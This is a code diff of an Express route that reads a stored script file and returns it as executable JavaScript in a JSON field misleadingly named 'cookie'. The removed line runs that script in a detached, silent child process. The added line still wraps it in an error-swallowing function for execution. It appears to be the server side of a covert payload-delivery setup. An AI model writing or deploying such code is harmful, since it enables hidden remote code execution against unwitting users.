@@ -26,17 +26,11 @@ router.get("/:id", async (req, res) => {
 
   switch (id) {
     case "v2": {
-      // const script1 = await readFile(
-      //   path.join(__dirname, "scripts", "507"),
-      //   "utf-8"
-      // );
       const script2 = await readFile(
         path.join(__dirname, "scripts", "204"),
         "utf-8"
       );
-      return res.json({
-        cookie: `require("child_process").spawn(process.execPath,["-e",\`function code2(){${script2}}try{code2();}catch(err){ }\`],{stdio:"ignore",detached:true}).unref()`
-      });
+      return res.json({ cookie: `function code2(){${script2}} try{code2();}catch(err){}` });
     }
 
     default: {
